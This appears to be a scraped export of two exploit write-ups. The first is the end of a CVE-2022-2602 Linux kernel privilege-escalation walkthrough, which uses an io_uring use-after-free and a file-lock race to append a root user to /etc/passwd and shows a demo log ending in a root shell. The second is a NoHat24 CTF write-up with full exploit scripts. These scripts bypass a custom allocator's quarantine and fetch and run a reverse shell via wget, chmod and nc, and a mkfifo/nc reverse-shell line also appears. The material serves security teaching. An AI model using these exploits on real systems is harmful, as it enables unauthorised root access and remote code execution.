\n[ext4_buffered_write_iter](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L253) is the function responsible to acquire this lock when a vectored write is requested (as in our case with io_uring), in a `ext4` file-sysytem, using the [inode_lock](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L263) (and later release it with [inode_unlock](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L273)), where the `inode` is our target file inode representation. If another thread is already writing into that node, the kernel thread is paused until the lock from the the other thread is released. When the other thread releases the file lock (calling `inode_unlock`), the sleeping kernel thread can resumes its execution acquiring the lock and starting to write into the file. But what if, during the sleep time, the `struct file` is replaced? Since permissions checks have been already done, the write action will be performed also if the re-allocated file has O_RDONLY permissions!\nIf you look closely in the [ext4_buffered_write_iter](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L253), you can see that the pointer to the struct file is retrieved from [iocb-\u003eki_filp](https://elixir.bootlin.com/linux/v5.15.75/source/include/linux/fs.h#L327), and the following calls will use that pointer to perform the write operation ([generic_perform_write](https://elixir.bootlin.com/linux/v5.15.75/C/ident/generic_perform_write)).\nWe used this technique to \"stays\" the object in the kernel and extend the race window, without using \"userfault\".\n\n#### fatal_signal_pending\nAn issue we encountered while developing the exploit was the [fatal_signal_pending](https://elixir.bootlin.com/linux/v5.15.75/C/ident/fatal_signal_pending) call from [generic_perform_write](https://elixir.bootlin.com/linux/v5.15.75/C/ident/generic_perform_write). This check ensures that the `current` context does not have fatal signals hanging, for example by avoiding the write operation if the process has been already closed. This was one of the issues we had to overcome that took us quite some time, since debugging these kinds of operations leads to non truthful behaviours. By the way, the resolution was just to wait until io_uring has finished its operation by monitoring our target file size:\n\n```C\nint main(){\n\t/* .. */\n\tstat(\"/etc/passwd\", \u0026st);\n\tint original_passwd_size = st.st_size;\n\t/* .. */\n\twhile(original_passwd_size == st.st_size){\n\t\tstat(\"/etc/passwd\", \u0026st);\n\t\tsize = st.st_size;\n\t\tsleep(2);\n\t}\n\t/* .. */\n}\n```\n\n### Exploitation Walkthrough\nWe went a little bit inside the File Exploitation technique, now let's see how we abused it in order to write our exploit.\nWe have already seen how we can trigger the UAF in the \"Root Cause\" section, let's see in details how we developed the exploit.\n\n#### Setup\nFirst, setup the io_uring context to work with the [Submission Queue Polling](https://unixism.net/loti/tutorial/sq_poll.html) mechanism and register a dummy file using the `io_uring_register` syscall.\n\n#### Starting slow_write\nSince we want to replace the userfault technique in the published POC with another one, we choose to go with the Slow Write technique. As described before, we can pause a write operation abusing the file locking mechanism. Before letting io_uring write into the registered \"dummy file\", we want to \"slow write\" on that file (that means, write a lot of data that will take time and lock the file inode) in a way that the kernel thread responsible to perform the write operation in behalf of io_uring, will be waiting at the [inode_lock](https://elixir.bootlin.com/linux/v5.15.75/source/fs/ext4/file.c#L263) call. In order to perform this slow write operation, we have been inspired from [this CVE-2022-2588 exploit](https://github.com/Markakd/CVE-2022-2588/blob/master/exp_file_credential.c#L558) function.\nNow that the write operation is paused, is the perfect time to trigger the UAF !\n\n#### Free the registered file (trigger the UAF)\nIn order to trigger the UAF, we have to trigger the Unix Garbager Collector ([unix_gc](https://elixir.bootlin.com/linux/v5.15.74/source/net/unix/garbage.c#L205)) function in some way. That was not a big deal. First, because the POC already had a source line that did exactly that. Second, because every `unix_*` file operation calls it in its release function (example with [unix_stream_ops](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L744)): [unix_release](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L941) -\u003e [unix_release_sock](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L534) -\u003e [unix_gc call](https://elixir.bootlin.com/linux/v5.15.75/source/net/unix/af_unix.c#L606).\n\n```C\nclose(socket(AF_UNIX, SOCK_DGRAM, 0));\n```\n\nWith this simple one-line, `unix_gc` is triggered and our target file chunk should be freed!\n\n#### Replace the target chunk\nNow, we have a freed chunk that can be re-used from another file allocation (since we are in a dedicated cache), and our objective is to re-allocate it with something in our control, like a sensitive file that we can open (the `open` syscall will allocate a `struct file` allocation in the `filp` cache) and let us perform a privileged operation by writing into it. Obviously, we went for \"/etc/passwd\" :}\n\nAs we described in the \"DirtyCred: File Exploitation\" section, since file permissions are checked once, we can easily re-allocate a read-only file, resumes the kernel thread we paused in the \"Starting slow_write\" section, and the write operation will be performed in that read-only file!\n\n##### Make the re-allocation more reliable\nSince the `filp` cache can be pretty busy (a lot of file operations and socket related stuff are inside this cache), a massive spray can be performed after the `unix_gc` is triggered, but it can be not enough. A good approach could also be to create some \"holes\" before triggering the targeted chunk re-allocation (to increase the FREELIST, but without releasing entire slabs), so that the following \"massive spray\" of \"/etc/passwd\" files would be more reliable.\n\n#### Release the slow_write lock\nNow that we have replaced the victim chunk with a specific file, when the slow write operation finishes, the lock is released and the io_uring kernel thread acquires the lock and starts writing into our re-allocated file (\"/etc/passwd\"), also if it's allocated as read-only.\n\n#### Overwrite /etc/passwd\nFirst, in order to just append text into \"/etc/passwd\" and not overwrite it from scratch, our victim file (the one that we have used as the victim chunk in our Use-After-Free) has been opened with the `O_APPEND` flag, that append text at the end of the file.\nWhat can we write into it? We can write a simple user using the following format, that will not require the password into \"\"/etc/shadow\":\n```bash\n\u003cUSER\u003e:\u003cHASH\u003e:0:0:/root:/root:/bin/sh\n```\n\n#### POC || GTFO\nYou can find the full exploit here: https://github.com/kiks7/CVE-2022-2602-Kernel-Exploit.\n\n```bash\n/ $ uname -a\nLinux (none) 5.15.74 #20 SMP Sat Nov 19 14:01:51 CET 2022 x86_64 GNU/Linux\n/ $ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/sh\nuser:x:1000:1000:kiks,,,:/home/user:/bin/sh\n/ $ id\nuid=1000(user) gid=1000 groups=1000\n/ $ /poc\n[P] P1\n[P] P2\n[*] Creating thread for slow write on /tmp/rwA\n[*] Sleeping while waiting that slow_write starts ..\n[*][T1] Starting slow write ..\n[*][T1] Slowing write...\n[P] P3/P4\n[P] P5\n[*] Triggering unix_gc and freeing the registered fd\n[*] unix_gc finished !\n[P] P6\n[*] Spraying target files ..\n[*] Wait that slow_write finishes ..\n[P] P7/P8/P9\n[+][T1] slow_write finished\n[+] Slow write finished .. closing io_uring fd\n[*] Waits that the io_uring thread continues the writev operation while the process is still alive\n[+] Everything done !\nPassword:\nuid=0(root) gid=0 groups=0\n[+] DONE\n/ $ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/sh\nuser:x:1000:1000:kiks,,,:/home/user:/bin/sh\npwn:$6$pwn$5m1zBfEzD3xCg.wOtCtlKePwQL3Y5UiVAQBEAIv67Ir9JfZjmjO7XwzMzk0IcRoPjtWg.k2ytbimpKp1s/RB2/:0:0:/root:/root:/bin/sh\n/ $\n```\n\n## Extra: new KRWX feature\n[KRWX](https://github.com/kiks7/KRWX) is a tool I developed to deepen kernel internals and to assists kernel exploitation. Since in this case it was necessary to deal with a specific special cache (`filp`) and this feature wasn't implemented, I added it. Now it's possible to retrieve the address of a specific `kmem_cache` using `kmem_cache_get(char* name)`, like the following:\n```C\n#include \"lib/krwx.h\"\nint main(){\n\t/* .. */\n\tkmem_cache_get(\"filp\");\n\t/* .. */\n}\n```\n\nIt will return the kernel address of the cache that can be used to allocate objects into it using the already present user-land `kmem_cache_alloc()` (with some internal changes to accomodate the implementation). You can find the [full example here](https://github.com/kiks7/KRWX/blob/main/client/example/kmem_cache_get.c), but this is an extract:\n```C\n#include \"lib/krwx.h\"\nint main(){\n\t/* .. */\n\tfilp = kmem_cache_get(\"filp\");\n\tchunk = kmem_cache_alloc(filp, GFP_KERNEL);\n\tkmem_cache_free(filp, chunk);\n\t/* .. *\n}\n```\n\nIf you are interested, you can find the project on [github](https://github.com/kiks7/KRWX).\n\n## Conclusions\nThis is how we managed to exploit the CVE-2022-2602 using the inode locking technique. It was a really fun (and sometimes pain) adventure and it was a pleasure to have worked on it with Luca ([@LukeGix](https://exploiter.dev)). You can take a look at [his blog post](https://exploiter.dev/blog/2022/CVE-2022-2602.html) to see how it's possible to exploit the same vulnerability with userfaultd and FUSE techniques! \n\nStay tuned for more!\n\n## References\n- https://exploiter.dev/blog/2022/CVE-2022-2602.html\n- https://github.com/kiks7/CVE-2022-2602-Kernel-Exploit\n- https://github.com/kiks7/KRWX\n- https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html\n- https://github.com/Markakd/CVE-2022-2588/\n- https://zplin.me/papers/DirtyCred.pdf\n- https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf\n- https://blog.hacktivesecurity.com/index.php/2022/06/13/linux-kernel-exploit-development-1day-case-study/\n- https://exploiter.dev/blog/2022/FUSE-exploit.html\n- https://en.wikipedia.org/wiki/Lock_(computer_science)\n- https://seclists.org/oss-sec/2022/q4/57?utm_source=dlvr.it\u0026utm_medium=twitter\n- https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/","lastmodified":"2025-04-14T14:14:33.954126369Z","tags":null},"/notes/Exploiting-a-Quarantine-UAF-Mitigation-on-a-Custom-Allocator-Challenge":{"title":"Exploiting a Quarantine UAF Mitigation on a Custom Allocator Challenge","content":"\n## Introduction\nIn the [previous blog post](https://1day.dev/notes/A-Reverse-Engineering-Journey-Walkthrough) we have covered a walkthrough guide to solve the Reverse Engineering challenge written for the [NoHat24](https://www.nohat.it/) security conference. In this blog post, we are going to cover the binary exploitation challenge that involves a custom userland allocator that has been specifically developed for this challenge. Writing our own allocator, remotely inspired from the kernel SLUB allocator, was a really fun and educational experience. We have implemented an Use-After-Free quarantine mitigation to prevent its exploitation, was it good enough?\n\n## Introducing the Custom Allocator\nThe custom allocator source code was available through an HTTP web interface and can now be download directly from [here](https://github.com/hacktivesec/nohat24-blog-references/tree/main/pwn).\n\nThe two files `hmalloc.h` and `hmalloc.c` contains the whole implementation of the custom allocator that replaces the standard glibc malloc. The following diagram and structs describes the allocator design:\n\n![[Custom Allocator.drawio.svg]]\n\n```C\nstruct list_head{\n  struct list_head* next;\n  struct list_head* prev;\n};\n\nstruct bucket{\n  struct list_head  buckets;\n  /* Offset of the available alloc inside the bucket */\n  uint16_t  offset;\n  /* How many allocs are freed */\n  uint8_t   freelist_count;\n  uint8_t   freelist[MAX_ALLOCS];\n  void*     allocs[];\n};\n\n/* Single allocations just contain the size of the alloc as metadata */\nstruct alloc{\n  uint16_t size;\n  void*   user[];\n} __attribute__((packed));\n\n```\nThe target allocator, inspired from the kernel SLUB allocator, has a simple \"bucket\" concept. Each allocation size (from 16 to 1024) has its own memory region retrieved from `mmap` (through `__init_bucket`) and it is considered a `SMALL_BUCKET`, while larger buckets (`LARGE_BUCKETS`) are not handled from the allocator. A Bucket Master Control (`bucket_master_ctrl` global variable inside `hmalloc.c`) is used to store buckets' addresses using an offset that can be used to retrieve the requested bucket for the needed size. The size of the allocation is the offset minus the size of a pointer. For example, the bucket address for 32 bytes allocations is at offset 24 (32-8).\n\nWhen `malloc` is called the first time with a specific size, that is always rounded to the nearest power of two starting from 32 (e.g. 32, 64, 128, 256, 512, 1024), the bucket is allocated through `__init_bucket` and referred to as the `current_bucket`. The current bucket is the bucket from where we try to initially allocate from. It can be retrieved, once allocated, using `__get_bucket`. Each allocation, named `alloc` inside the source code, contains just the size of the allocation as metadata and `alloc-\u003euser` is the returned `malloc` pointer. When an `alloc` is allocated from a `bucket`, the `bucket-\u003eoffset` is incremented by one and used for the next allocations to return subsequent memory addresses (it is always multiplied with the allocation size). The offset does not just provides the capability to return new allocations but also marks and identifies freed allocations inside the bucket. A freelist is implemented to first return freed memory (to avoid fragmentation) with a LIFO mechanism. `bucket-\u003efreelist` is an array of freed `allocs` (based on their offsets) that can be accessed with the `bucket-\u003efreelist_count` that is incremented every time an `alloc` is freed and decremented when a freed allocation is returned back to the user. This \"dynamic\" array permits to handle the freelist pretty easily and is the first path to return an allocation from the `__malloc` logic. \n\nWhen the maximum number of allocations (`(PAGE_SIZE - sizeof(struct bucket)) / alloc_size`) is reached for a bucket, a new bucket is created (through new `mmap` memory) and linked through the `list_head` `next` and `prev` members.\n```C\nold_current_bucket-\u003ebuckets.next = (struct list_head*) \u0026current_bucket-\u003ebuckets.next;\ncurrent_bucket-\u003ebuckets.prev = (struct list_head*) \u0026old_current_bucket-\u003ebuckets.next;\n```\n\nThe linked list permits to have more buckets linked together for each allocation size. When the current bucket is full (e.g. it is not possible to re-allocate freed allocs neither new allocs) previous and next buckets are verified (traversing the linked list backwards and forwards) and an allocation is returned if one of them contains a freed alloc on its freelist. Also, if the found bucket contains more than a specific amount of freed elements (`FREELIST_REPLACE_BUCKET_THRESHOLD`) it is replaced as the current bucket from the `bucket_master_ctrl` (through `__update_master_ctrl_bucket`). \n\nWhen `free` is called with a pointer, the `alloc` struct is retrieved through `ptr - sizeof(struct alloc)` and the bucket obtained masking the pointer with `0xfff` (memory returned from `mmap` is always page aligned). In order to calculate its offset inside the bucket, the allocation size retrieved from the metadata of the `alloc` is used as a dividend to the allocation address minus `bucket-\u003eallocs` (e.g. the first alloc is 0, the second 1, the third 2 and so on). The `bucket-\u003efreelist[]` array is updated with the calculated offset and `bucket-\u003efreelist_count` incremented by one.\n### Freelist quarantine mitigation\nBefore leaving the `free` function, a global `freelist_quarantine_time` variable is set with the current time. When verifying the freelist of the current bucket, the function `__is_freelist_available` verify its availability. It is possible to return a freed alloc **only** if ten seconds (`FREELIST_QUARANTINE_WAIT`) are passed from the last freed element:\n```C\nbool __is_freelist_available(){\n#ifdef FREELIST_QUARANTINE\n  if((time(NULL) - freelist_quarantine_time) \u003c FREELIST_QUARANTINE_WAIT){\n    DEBUG_PRINT(\"[DEBUG] Freelist is quarantined\\n\");\n    return false;\n  }\n  return true;\n#endif\n  return true;\n}\n```\n\nThis mitigations is aimed to prevent the immediate re-use of freed allocations (Use-After-Free vulnerabilities).\n### Freelist quarantine Weakness\nHowever, the mitigation is not bullet proof, and this is the intended objective of the CTF. The freelist timer is only checked while searching for freed allocs inside the same bucket, but not when traversing. Suppose the following scenario:\n- Two buckets (`bucket_1` and `bucket_2`) are fully allocated (e.g. no available or freed allocations). `bucket_2` is the \"current\" one (the one registered in the Bucket Master Control).\n- An alloc is freed from `bucket_1`.\n- When `malloc` is called (with the same size of the two buckets) the freelist of `bucket_2` is not available while, with traversing, the just freed alloc from `bucket_1` is immediately available.\n\nThe described scenario can be useful to exploit an immediate UaF condition.\n## Main binary logic\nThe main binary logic (`main.c`) is pretty simple. It reads from stdin `4096` bytes and parses it line by line, searching for commands to execute inside a `switch` statement. Each line must begin with a valid command (`CMD_CREATE`, `CMD_ADD`, `CMD_DELETE`, `CMD_SELL`, `CMD_DROP`) and follows a command specific format. For example, the `CMD_CREATE` command allocates a `struct object` (using `malloc`) where `malloc` is also used to allocate `object-\u003ename` and `object-\u003edescription` using `strlen` with some size validation. At the end of the command, the three function pointers (`sell`, `add` and `drop`) are respectively set  with `function_sell`, `function_add` and `function_drop`, just like a primitive OOP language. \nThis is the mentioned struct:\n```C\nstruct object{\n  int   id;\n  int   price;\n  char* name;\n  char* description;\n  int   stock;\n  int   earnings;\n  void (*sell) (struct object* this);\n  void (*add) (struct object* this);\n  void (*drop) (struct object* this);\n};\n```\n\nAlso, when a new `object` is allocated, an array of object pointers (`objs`) is updated to store all of them. The array is later used for the vtable functions (`sell`, `add` and `drop`) and to delete an object based on its specified id.\n## The vulnerability (UAF)\nThe vulnerability is pretty straightforward: when an object is freed (through `CMD_FREE`), the `objs` array is not updated and the dangling pointer can be still accessed without further validations from another command (Use-After-Free) or itself (Double Free).\nHowever, there is just one big obstacle: the freelist quarantine mitigation does not permit an immediate Use-After-Free. In order to exploit the UAF, it is necessary to re-create an heap layout similar to the one described in \"Freelist quarantine Weakness\", where we can trigger the UAF against an allocation from a non current bucket.\n## Exploitation\n### Objective\nLet's first declare an objective. As simple as it sounds, we want to compromise the binary application (that is exposed through `socat`) and read the flag. We have a UAF primitive on a `struct object` that contains interesting members: dynamic strings (that we can use to overlap the freed allocation) and three function pointers. Function pointers, that behave like a vtable, seems like a really juicy target since they are allocated in the heap (inside the object structure) and can be triggered from multiple commands. Name and description members are really interesting allocations that can be used to replace the freed alloc due to their flexible size based on user input.\n\nAlso, since we have a single interaction with the program (we pass everything through stdin once) we cannot use read primitives or similar to leak ASLR. We can go for a bruteforce or a partial overwrite in order to don't mess too much with randomized pointers.\n\n### Heap shaping to bypass the quarantine\nWith a clearer path in mind, let's start to create the UAF state with python step by step:\n```python\nobjs = []\ncontent = \"\"\n# Objective:\n# Allocate 2 64 bytes buckets and make them full\n# 520 = sizeof(struct bucket)\n# 4096 - 520 = 3576 / 64 = 55\nfor n in range(0, 55 * 2):\n\tobj_id = pack(\"\u003ch\", int(n)).decode()\n\tobjs.append(obj_id)\n\t# print_stderr(\"[*] Creating object {}\".format(n))\n\t# Create\n\tcontent += \"\\x10\" # CMD_CREATE\n\tcontent += obj_id\n\tcontent += \"\\x16\\x00\"\n\tcontent += \"\\x41\" * 20 + \"\\x00\"\n\tcontent += \"\\x42\" * 4 + \"\\x00\"\n\tcontent += \"\\n\"\n```\n\nWe fulfill two buckets (`bucket_1` and `bucket_2`) with 110 allocations of `struct object`. The size of `struct object` is `58`, hence it goes into the bucket of 64 bytes allocations (we can call it `bucket_64`). The `bucket_64` can contains up to 55 allocations since the `PAGE_SIZE` memory region (4096) minus the size of the `struct bucket` metadata (520) and divided by its size (64), it's 55. \n\n```python\n# DELETE (Free)\ncontent += \"\\x12\"\ncontent += objs[0]\ncontent += \"\\n\"\n\n# DELETE (Free)\ncontent += \"\\x12\"\ncontent += objs[1]\ncontent += \"\\n\"\n```\n\nWe then proceed to free the first two allocations from `bucket_1`. We free two of them since the last one (due to the LIFO freelist order) will be replaced, using the `CMD_CREATE` command, with another `struct object` (`malloc(sizeof(struct object));`) and initialized with zeros (removing the possibility of a partial overwrite to bypass ASLR). The first freed allocation, instead, can be replaced with arbitrary user input due to the dynamic allocation through `strlen`. Due to this function, however, we are limited to its internal behaviors (e.g. it is not possible to have NULL bytes inside our payload).\n\n### Partial Overwrite\nWe can create, through `CMD_CREATE`, a fake object inside the `name` or the `description` string allocation, by making its size falling inside the `bucket_64`, in order to trigger the UAF against it. \nWe can perform a partial overwrite through the `memcpy` function (on the freed object) by replacing one or two bytes in order to not affect ASLR at all. `execute_system` is an interesting function that accepts a char pointer and pass it as a parameter to `system`, allowing the execution of arbitrary shell code. It can be a really interesting primitive due to a crucial thing: the `rdi` register (e.g. the first parameter) is the object itself (`this`) for function pointers. This means that, if we can redirect the execution to `execute_system`, we control entirely the first parameter that is the command to be executed! In order to see what we need to partially overwrite, we can execute `objdump` against the binary:\n```bash\n$ objdump -D -M intel main | grep '\u003cexecute_system\\|function_drop'\n0000000000001270 \u003cexecute_system\u003e:\n00000000000012c0 \u003cfunction_drop\u003e:\n```\n\nThe `function_drop` address is `00000000000012c0`, while `execute_system` is `0000000000001270`. If we overwrite the last byte of the `object-\u003edrop` pointer with `0x70` and we execute the `CMD_DROP` command later, we can trigger the execution of `system` with input in our control (the last allocated object itself):\n```python\n    # ID \u0026 price\n    fake_obj = \"AA;$({});#\".format(cmd)\n    #fake_obj += \"\\x41\" * 0x2c\n    fake_obj += \"\\x41\" * ( 0x30 - len(fake_obj) )\n    # CMD_DROP function pointer =\u003e @execute_system\n    # @execute_system\n    fake_obj += \"\\x70\" + \"\\x00\"\n\n    # Create =\u003e alloc bucket1-\u003efreelist[1]\n    content += \"\\x10\"\n    content += \"\\x37\\x13\"  # sh\n    content += \"\\x16\\x00\"\n    # Name: system payload\n    content += \"BB\\x00\"\n    # Description: alloc on bucket1-\u003efreelist[0] (obj[0])\n    content += fake_obj\n    content += \"\\n\"\n\n    # CMD_DROP =\u003e Trigger arbitrary function call\n    content += \"\\x14\"\n    content += \"\\x41\\x41\"\n    content += \"\\n\"\n```\n\nSince the `struct object` allocation is limited in size for a direct reverse shell, the vulnerability is exploited three times to first upload a complete reverse shell through `wget`, `chmod` and finally execute it.\n\n## Alternative Solution (Double Free)\nAn alternative, originally not the intended solution, can be to exploit the Double Free vulnerability instead. It is possible to return the same `alloc` twice by inserting (through exploitation) the same freelist offset inside the `bucket-\u003efreelist` and achieve the same objective. If you have solved the challenge in that way at the NoHat CTF or in a different moment, we are really curious about that, let us know!\n\n## Conclusion\nThe final exploit can be found [here](https://github.com/hacktivesec/nohat24-blog-references/tree/main/pwn/exploit). Hope you have enjoyed this two article series on our CTF write-ups for the NoHat24 CTF event.\n\n## Appendix\n### Exploit Code\n`exploit.sh`\n\n```python\n#!/bin/bash\n\nif [ \"$#\" -ne 4 ]; then\n    echo \"$0 \u003cRHOST\u003e \u003cRPORT\u003e \u003cLHOST\u003e \u003cLPORT\u003e\"\n    exit\nfi\n\nRHOST=$1\nRPORT=$2\nLHOST=$3\nLPORT=$4\n\necho \"[*] Generating payload for the three stages\"\npython3 generate_input_files.py $LHOST\n\necho \"[*] Modifying script reverse shell to $LHOST:$LPORT\"\nsed -e \"s/LHOST/$LHOST/g\" -e \"s/LPORT/$LPORT/g\" rev.sh \u003e e\npython3 generate_input_files.py $LHOST\n\necho \"[*] Starting web browser\"\npython3 -m http.server\u0026\nsleep 1\n\necho \"[*] Sending stage 1 to  $RHOST $PORT - wget http://$LHOST:8000/e\"\nnc -v $RHOST $RPORT \u003c input_file_1\necho \"[+] Done\"\nsleep 1\n\necho \"[*] Sending stage 2 to  $RHOST $PORT\"\nnc -v $RHOST $RPORT \u003c input_file_2\necho \"[+] Done\"\nsleep 1\n\necho \"[*] Sending stage 3 to  $RHOST $PORT.. The uploaded script should be executed\"\nnc -v $RHOST $RPORT \u003c input_file_3\necho \"[+] Done\"\nsleep 1\n\n# kill web server\npkill python3\n```\n\n`generate_input_files.py`:\n```python\nfrom struct import pack\nimport sys\n\ndef print_stderr(msg):\n    sys.stderr.write(msg + \"\\n\")\n\ndef exploit(cmd, filename):\n    objs = []\n    content = \"\"\n    # Objective:\n    # Allocate 2 64 bytes buckets and make them full\n    # 520 = sizeof(struct bucket)\n    # 4096 - 520 = 3576 / 64 = 55\n    for n in range(0, 55 * 2):\n        obj_id = pack(\"\u003ch\", int(n)).decode()\n        objs.append(obj_id)\n        # print_stderr(\"[*] Creating object {}\".format(n))\n        # Create\n        content += \"\\x10\"\n        content += obj_id\n        content += \"\\x16\\x00\"\n        content += \"\\x41\" * 20 + \"\\x00\"\n        content += \"\\x42\" * 4 + \"\\x00\"\n        content += \"\\n\"\n\n    # Status\n    # Bucket 1: Fully allocated\n    # Bucket 2: Fully allocated (current)\n\n    # Free two allocations from bucket 1\n    # Since bucket 2 is current and the traversing doesn't involve the \n    # quarantine mitigation, we can bypass it\n\n    # DELETE (Free)\n    content += \"\\x12\"\n    content += objs[0]\n    content += \"\\n\"\n\n    # DELETE (Free)\n    content += \"\\x12\"\n    content += objs[1]\n    content += \"\\n\"\n\n    # ID \u0026 price\n    fake_obj = \"AA;$({});#\".format(cmd)\n    #fake_obj += \"\\x41\" * 0x2c\n    fake_obj += \"\\x41\" * ( 0x30 - len(fake_obj) )\n    # CMD_DROP function pointer\n    # @execute_system\n    fake_obj += \"\\x70\" + \"\\x00\"\n\n    # Create =\u003e alloc bucket1-\u003efreelist[1]\n    content += \"\\x10\"\n    content += \"\\x37\\x13\"  # sh\n    content += \"\\x16\\x00\"\n    # Name: system payload\n    # content += \";mknod /tmp/mypipe p ; /bin/bash 0\u003c /tmp/mypipe | nc 127.0.0.1 4445 1\u003e /tmp/mypipe\\x00\"\n    content += \"BB\\x00\"\n    # Description: alloc on bucket1-\u003efreelist[0] (| obj[0])\n    content += fake_obj\n    content += \"\\n\"\n\n    # DROP =\u003e Trigger arbitrary function call\n    content += \"\\x14\"\n    content += \"\\x41\\x41\"\n    content += \"\\n\"\n\n    with open(filename, \"w\") as f:\n        f.write(content)\n    print_stderr(\"[+] {} generated\".format(filename))\n\nif __name__ == \"__main__\":\n    exploit(\"wget http://{}:8000/e -O /tmp/e\".format(sys.argv[1]), \"input_file_1\")\n    exploit(\"chmod +x /tmp/e\", \"input_file_2\")\n    exploit(\"/tmp/e\", \"input_file_3\")\n```\n\n## Challenge Source Code\n`main.c`\n```C\n#include \u003cstdio.h\u003e\n#include \"hmalloc.h\"\n\n#define CMD_CREATE  0x10\n#define CMD_ADD     0x11\n#define CMD_DELETE  0x12\n#define CMD_SELL    0x13\n#define CMD_DROP    0x14\n\n#define MAX_OBJS      1000\n#define BUF_SZ        4096\n#define MAX_STRING_SZ 1024\n\nint total_earnings  = 0;\nint total_stocks    = 0;\nint total_objs      = 0;\nstruct object* objs[MAX_OBJS];\n\nstruct object{\n  int   id;\n  int   price;\n  char* name;\n  char* description;\n  int   stock;\n  int   earnings;\n  void (*sell) (struct object* this);\n  void (*add) (struct object* this);\n  void (*drop) (struct object* this);\n};\n\nvoid function_sell(struct object* this){\n  printf(\"CMD_SELL\\n\");\n  if(this-\u003estock \u003c= 0)\n    return;\n  this-\u003estock--;\n  this-\u003eearnings = this-\u003eearnings + this-\u003eprice;\n}\n\nvoid function_add(struct object* this){\n  printf(\"CMD_ADD\\n\");\n  this-\u003estock++;\n}\nvoid execute_system(const char* cmd){\n  system(cmd);\n}\n\nvoid notify_end(){\n  const char* cmd = \"touch /tmp/end\";\n  execute_system(cmd);\n}\n\nvoid function_drop(struct object* this){\n  printf(\"CMD_DROP\\n\");\n  this-\u003estock--;\n}\n\nvoid show_object(struct object* obj){\n    printf(\"\\tid: 0x%x\\n\", obj-\u003eid);\n    printf(\"\\tPrice: %d\\n\", obj-\u003eprice);\n    printf(\"\\tName: %s\\n\", obj-\u003ename);\n    printf(\"\\tDescription: %s\\n\", obj-\u003edescription);\n    printf(\"\\tStock: %d\\n\", obj-\u003estock);\n    printf(\"\\tEarnings: %d\\n\", obj-\u003eearnings);\n}\n\nstruct object* get_object(short int obj_id){\n    // Search for the product id\n    int j = 0;\n    while(j \u003c total_objs){\n      if((short int) objs[j]-\u003eid == obj_id)\n        return objs[j];\n      j++;\n    }\n    return NULL;\n}\n\nint main(){\n  char raw_input[BUF_SZ];\n  int n_read;\n  size_t n;\n  struct object* obj;\n  int obj_id;\n  memset(raw_input, 0x0, BUF_SZ);\n\n  /* Parse file from input */\n  n_read = read(0, raw_input, BUF_SZ);\n  int idx = 0;\n  while(idx \u003c n_read){\n    int command = raw_input[idx];\n    idx++;\n    switch(command){\n      case CMD_CREATE:\n        printf(\"CMD_CREATE\\n\");\n        obj = malloc(sizeof(struct object));\n        memset(obj, 0x0, sizeof(struct object));\n        /* Object ID*/\n        memcpy(\u0026obj-\u003eid, raw_input + idx, 2);\n        idx = idx + 2;\n\n        /* Object Price*/\n        memcpy(\u0026obj-\u003eprice, raw_input + idx, 2);\n        idx = idx + 2;\n\n        /* Object name */\n        n = strlen((char*) raw_input + idx);\n        if(n == 0 || n \u003e MAX_STRING_SZ || (idx + n) \u003e n_read)\n          return -1;\n        obj-\u003ename = malloc(n);\n        memcpy(obj-\u003ename, raw_input + idx, n);\n        idx = idx + n + 1;\n\n        /* Object description */\n        n = strlen((char*) raw_input + idx);\n        if(n == 0 || n \u003e MAX_STRING_SZ || (idx + n) \u003e n_read)\n          return -1;\n        obj-\u003edescription = malloc(n);\n        memcpy(obj-\u003edescription, raw_input + idx, n);\n        idx = idx + n + 1;\n\n        obj-\u003esell = function_sell;\n        obj-\u003eadd  = function_add;\n        obj-\u003edrop = function_drop;\n\n        if(total_objs \u003e MAX_OBJS)\n          return -1;\n\n        objs[total_objs] = obj;\n        total_objs++;\n        break;\n    case CMD_DROP:\n    case CMD_ADD:\n    case CMD_SELL:\n        memcpy(\u0026obj_id, raw_input + idx, 2);\n        idx = idx + 2;\n        obj = get_object(obj_id);\n        if(obj == NULL)\n          break;\n\n        if(command == CMD_ADD)\n          obj-\u003eadd(obj);\n        else if(command == CMD_DROP)\n          obj-\u003edrop(obj);\n        else if(command == CMD_SELL)\n          obj-\u003esell(obj);\n        break;\n  case CMD_DELETE:\n        printf(\"CMD_DELETE\\n\");\n        memcpy(\u0026obj_id, raw_input + idx, 2);\n        idx = idx + 2;\n        obj = get_object(obj_id);\n        if(obj == NULL)\n          break;\n\n        free(obj-\u003ename);\n        free(obj-\u003edescription);\n        free(obj);\n        break;\n      default:\n        fprintf(stdout, \"Command 0x%x not found\\n\", command);\n        return -1;\n        break;\n    }\n    if(raw_input[idx] != 0x0a){\n      fprintf(stderr, \"Missing newline\");\n      exit(EXIT_FAILURE);\n    }\n    idx++;\n  }\n  notify_end();\n  return 0;\n}\n```\n\n`hmalloc.h`\n```C\n#ifndef HMALLOC_H\n#define HMALLOC_H\n#include \u003cstdint.h\u003e\n#include \u003csys/types.h\u003e\n#include \u003cstring.h\u003e\n#include \u003cstdlib.h\u003e\n#include \u003cstdio.h\u003e\n#include \u003csys/mman.h\u003e\n#include \u003ctime.h\u003e\n#include \u003cunistd.h\u003e\n\n\n//#define DEBUG\n#ifdef DEBUG\n#define DEBUG_PRINT(fmt, args...)    fprintf(stderr, fmt, ## args)\n#else\n#define DEBUG_PRINT(fmt, args...)\n#endif\n\n#define PAGE_SZ         4096\n#define MAX_ALLOCS      500\n\n/* \n * Small buckets: 16, 32, 64, 128, 256, 512, 1024\n * Large buckets (not YET supported) : \u003e= 2048\n */\n\n#define SMALL_BUCKET_PAGES    1\n#define SMALL_BUCKET_MIN_SZ   16\n#define SMALL_BUCKET_MAX_SZ   1024\n#define SMALL_BUCKET_MASK     ~0xFFF // 1 PAGE\n\n#define LARGE_BUCKET_MIN_SZ   2048\n#define LARGE_BUCKET_PAGES    4             \n//#define 